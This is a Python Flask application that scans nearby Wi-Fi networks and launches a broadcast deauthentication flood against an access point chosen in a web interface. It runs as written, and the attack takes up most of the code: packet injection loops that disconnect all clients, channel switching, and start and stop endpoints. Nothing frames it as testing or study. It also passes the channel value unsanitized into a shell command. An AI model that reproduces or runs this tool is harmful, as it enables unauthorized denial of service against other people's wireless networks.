from flask import Flask, render_template, request, jsonify
from scapy.all import *
import threading
import os
import time

app = Flask(__name__)

# CONFIG: Update to your monitor interface (run 'iwconfig' to find)
INTERFACE = "wlan0mon" 
attacking = False
packet_count = 0
found_nets = {}

# 1. SCANNER ENGINE: Collects SSID, BSSID, and Channel
def scanner_handler(pkt):
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr2
        ssid = pkt[Dot11Elt].info.decode(errors="ignore") or "Hidden"
        # Extract channel from beacon frames
        try:
            channel = int(ord(pkt[Dot11Elt:3].info))
        except:
            channel = "Unknown"
        dbm = getattr(pkt, 'dBm_AntSignal', 'N/A')
        found_nets[bssid] = {"ssid": ssid, "dbm": dbm, "ch": channel}

# 2. DEAUTH ENGINE: Injects packets into specific target
def deauth_engine(target_bssid, channel):
    global attacking, packet_count
    # Force adapter to target's channel
    os.system(f"iw dev {INTERFACE} set channel {channel}")
    
    # addr1=Broadcast (Kills all clients), addr2/3=AP BSSID
    pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid)/Dot11Deauth(reason=7)
    
    while attacking:
        sendp(pkt, iface=INTERFACE, count=100, inter=0.01, verbose=False)
        packet_count += 100

@app.route('/')
def index(): return render_template('index.html')

@app.route('/scan', methods=['POST'])
def scan():
    global found_nets
    found_nets = {}
    # Sniff for 7 seconds to catch all nearby beacons
    sniff(iface=INTERFACE, prn=scanner_handler, timeout=7)
    return jsonify([{"ssid": v["ssid"], "bssid": k, "signal": v["dbm"], "ch": v["ch"]} for k, v in found_nets.items()])

@app.route('/attack', methods=['POST'])
def attack():
    global attacking, packet_count
    data = request.json
    attacking = True
    packet_count = 0 
    threading.Thread(target=deauth_engine, args=(data['bssid'], data['ch']), daemon=True).start()
    return jsonify({"status": "STRIKE_ENGAGED"})

@app.route('/stop', methods=['POST'])
def stop():
    global attacking
    attacking = False
    return jsonify({"status": "HALTED"})

@app.route('/stats')
def stats(): return jsonify({"count": packet_count, "active": attacking})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
